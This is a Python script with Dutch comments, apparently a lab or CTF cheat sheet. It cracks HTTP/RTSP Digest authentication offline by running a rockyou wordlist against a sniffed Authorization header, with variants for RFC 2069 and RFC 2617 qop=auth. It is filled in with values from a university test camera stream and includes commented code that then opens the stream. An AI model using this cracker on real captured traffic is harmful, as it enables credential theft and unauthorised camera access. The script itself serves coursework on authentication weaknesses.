"""
HTTP/RTSP DIGEST AUTHENTICATION KRAKEN (offline dictionary attack)
=======================================================================
WANNEER GEBRUIKEN?
  - Je ziet "Authorization: Digest username=..., realm=..., nonce=...,
    uri=..., response=..." in afgeluisterd verkeer (Wireshark/tshark).

FORMULE (RFC 2069 -- de eenvoudige, OUDE variant, ZONDER qop):
  HA1 = MD5(username:realm:password)
  HA2 = MD5(method:uri)
  response = MD5(HA1:nonce:HA2)

HOE WEET JE OF HET RFC 2069 IS (zonder qop) EN NIET DE NIEUWERE RFC 2617?
  Kijk of er een qop-veld (en bijhorende cnonce, nc) in de headers staat.
  GEEN qop -> bovenstaande simpele formule. WEL qop=auth -> zoek de
  uitgebreide formule op (extra cnonce:nc:qop in de laatste hash).

VOORBEELD WAAR DIT OP TOEGEPAST WERD: "Security Cam" (RTSP).
"""
import hashlib


def crack_digest_rfc2069(username: str, realm: str, nonce: str, method: str,
                          uri: str, target_response: str,
                          wordlist_path: str = "rockyou.txt") -> str | None:
    HA2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()

    with open(wordlist_path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            password = line.rstrip("\n")
            HA1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest()
            response = hashlib.md5(f"{HA1}:{nonce}:{HA2}".encode()).hexdigest()
            # GEEN print() hier binnenin -- dat maakt het uren trager!
            if response == target_response:
                return password
    return None


def crack_digest_rfc2617_qop_auth(username: str, realm: str, nonce: str,
                                   method: str, uri: str, qop: str,
                                   nc: str, cnonce: str, target_response: str,
                                   wordlist_path: str = "rockyou.txt") -> str | None:
    """Uitgebreide variant MET qop=auth (RFC 2617). Gebruik enkel als er
    effectief een qop-veld in de headers staat!"""
    HA2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()

    with open(wordlist_path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            password = line.rstrip("\n")
            HA1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest()
            response = hashlib.md5(
                f"{HA1}:{nonce}:{nc}:{cnonce}:{qop}:{HA2}".encode()
            ).hexdigest()
            if response == target_response:
                return password
    return None


if __name__ == "__main__":
    # TODO: vul de echte waarden in (uit de Authorization-header in Wireshark)
    result = crack_digest_rfc2069(
        username="user",
        realm="PythonRTSP",
        nonce="4874a055c3f4390506d99e6c51a9e3e360cbef8a62abd7079e11faddcb70a38c",
        method="DESCRIBE",
        uri="rtsp://cns-test.idlab.uantwerpen.be:50002/video",
        target_response="b3539154c5b784bba2c47a1a6c7c4ab0",
        wordlist_path="rockyou.txt",
    )
    print("Wachtwoord:", result)

    # Daarna kan je de stream bekijken met (OpenCV, forceer TCP transport):
    # url = f"rtsp://user:{result}@cns-test.idlab.uantwerpen.be:50002/video"
    # import cv2, os
    # os.environ["OPENCV_FFMPEG_CAPTURE_OPTIONS"] = "rtsp_transport;tcp"
    # cap = cv2.VideoCapture(url, cv2.CAP_FFMPEG)
